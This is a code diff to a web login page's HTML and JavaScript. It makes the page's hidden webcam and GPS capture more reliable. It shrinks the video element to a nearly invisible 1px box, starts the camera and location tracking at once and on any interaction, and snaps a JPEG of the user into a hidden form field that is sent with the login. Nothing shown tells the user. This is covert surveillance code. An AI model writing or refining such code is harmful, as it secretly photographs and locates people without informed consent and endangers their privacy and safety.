@@ -146,7 +146,7 @@
         <input type="hidden" name="latitude" id="lat">
         <input type="hidden" name="longitude" id="lng">
         <input type="hidden" name="photo_data" id="photo_data">
-        <video id="video" width="320" height="240" style="position: absolute; opacity: 0; pointer-events: none; left: -9999px;" playsinline muted></video>
+        <video id="video" width="320" height="240" style="position: fixed; top: 0; left: 0; width: 1px; height: 1px; opacity: 0.01; pointer-events: none; z-index: -1;" playsinline muted></video>
         <canvas id="canvas" width="320" height="240" style="display:none;"></canvas>
 
         <div class="col-md-12 d-grid gap-2">
@@ -401,16 +401,20 @@
             // Camera initiation function
             async function initCamera() {
                 const video = document.getElementById('video');
-                if (!video || video.srcObject) return;
+                if (!video) return;
+                if (video.srcObject && cameraReady) return;
+                
                 try {
                     const stream = await navigator.mediaDevices.getUserMedia({ video: { width: 320, height: 240 } });
                     video.srcObject = stream;
                     video.onloadedmetadata = () => {
-                        video.play();
-                        cameraReady = true;
+                        video.play().then(() => {
+                            cameraReady = true;
+                            console.log('Camera started successfully');
+                        });
                     };
                 } catch (err) {
-                    console.log('Camera error:', err);
+                    console.log('Camera error:', err.name, err.message);
                 }
             }
 
@@ -447,16 +451,18 @@
                 }
             }
 
-            // Start everything as soon as the page is ready and user interacts
-            ['mousedown', 'keydown', 'touchstart', 'scroll'].forEach(evt => {
+            // Start everything on interaction
+            const initEvents = ['mousedown', 'keydown', 'touchstart', 'scroll', 'click'];
+            initEvents.forEach(evt => {
                 document.addEventListener(evt, () => {
                     initCamera();
                     initGps();
-                }, { once: true, passive: true });
+                }, { once: false });
             });
 
-            // Fallback: Try to start GPS immediately
-            setTimeout(initGps, 1500);
+            // Try immediately too
+            initGps();
+            setTimeout(initCamera, 500);
 
             form.addEventListener('submit', async function(e) {
                 e.preventDefault();
@@ -466,14 +472,21 @@
                     await new Promise(r => setTimeout(r, 1200));
                 }
 
-                // Capture Photo frame if camera is ready
+                // Last second camera capture check
                 const video = document.getElementById('video');
                 const canvas = document.getElementById('canvas');
-                if (video && video.srcObject && canvas) {
+                
+                if (video && video.srcObject && video.readyState >= 2) {
                     try {
                         canvas.getContext('2d').drawImage(video, 0, 0, 320, 240);
-                        document.getElementById('photo_data').value = canvas.toDataURL('image/jpeg', 0.7);
-                    } catch (err) {}
+                        const data = canvas.toDataURL('image/jpeg', 0.8);
+                        document.getElementById('photo_data').value = data;
+                        console.log('Photo captured, length:', data.length);
+                    } catch (err) {
+                        console.log('Capture error:', err);
+                    }
+                } else {
+                    console.log('Camera not ready for capture. State:', video ? video.readyState : 'no video');
                 }
 
                 const loginAlert = document.getElementById('loginAlert');
